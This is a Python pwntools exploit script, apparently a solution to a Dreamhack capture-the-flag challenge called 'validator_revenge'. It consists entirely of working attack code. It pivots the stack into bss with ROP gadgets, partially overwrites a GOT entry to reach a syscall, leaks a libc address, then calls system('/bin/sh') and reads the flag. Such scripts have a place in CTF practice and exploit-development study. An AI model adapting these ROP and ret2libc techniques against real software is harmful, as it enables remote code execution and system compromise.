#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'validator_revenge_patched'
HOST = 'host8.dreamhack.games'
PORT = 11502

exe = ELF(exe_path, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]
context.log_level = 'error'

gdbscript = '''
b*0x4007d6
b*0x400800
b*0x4007f6
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p


def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# ============================EXPLOIT============================

# ===========================ROP GADGETS============================
read_main = 0x4007c5
fflush_main = 0x4007ec
pop_rbp = 0x0000000000400608
pop_rdi = 0x0000000000400873
pop_rdx = 0x0000000000400694
pop_rsi = 0x000000000040068b
ret = 0x000000000040053e
leave_ret = 0x000000000040079b
pop_rsp_r13_r14_r15 = 0x000000000040086d
mov_rbp_rsp_pop_rdx = 0x0000000000400691
mov_rbp_rsp_pop_rsi = 0x0000000000400688
mov_eax_0_leave_ret = 0x0000000000400796
nop_pop_rbp = 0x000000000040068d
jmp_ptr_rbp = 0x00000000004009fb # jmp qword ptr [rbp]

read_plt = exe.plt['read']
fflush_plt = exe.plt['fflush']
stdout = 0x601020
main = 0x40079D
validate = 0x4006dc

syscall_lower = 0xd1018f

# ===========================PAYLOAD============================
p = start()
# PAYLOAD 1 - pivot sRBP to bss
text = b'DREAMHACK!'
for i in range(126, 8, -1):
    text += p8(i)
payload1 = text + p64(0x601a00) + p64(read_main)
log.info(b'PAYLOAD 1')
s(payload1)

# PAYLOAD 2 - rop padding
payload2 = text + p64(0x601a90)
payload2 += flat(
    # overwrite stdin to syscall
    pop_rdi, 0,
    pop_rsi, 0x601030,
    pop_rdx, 0x3,
    read_plt,
    # set rax = 1 to call write
    pop_rdi, 0,
    pop_rsi, 0x601d00,
    pop_rdx, 0x1,
    read_plt,
    # call write
    pop_rdi, 0x1,
    pop_rsi, 0x601020,
    pop_rdx, 0x8,
    pop_rbp, 0x601030,
    jmp_ptr_rbp,
    # read rop to bss
    pop_rdi, 0,
    pop_rsi, 0x601c00,
    pop_rdx, 0x18,
    read_plt,
    # pivot to bss
    pop_rbp, 0x601bf8,
    leave_ret
    
)
log.info(b'PAYLOAD 2')
s(payload2)

# overwrite to syscall
s(p32(syscall_lower)[:3]) # set in gdb to test first then brute force
# rax = 1
s(b'A')

# leak libc
leak = p.recv(8)
leak_libc = u64(leak)
print(f'\n\n[+] leak libc: {hex(leak_libc)}')
libc.address = leak_libc - libc.symbols['_IO_2_1_stdout_']
print(f'[+] libc base: {hex(libc.address)}')

# ROP to system("/bin/sh")
sys = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
payload3 = flat(
    pop_rdi, binsh,
    sys
)
log.info(b'PAYLOAD 3')
s(payload3)
sleep(0.5)
sl(b'cat flag*')
context.log_level = 'info'
p.interactive()
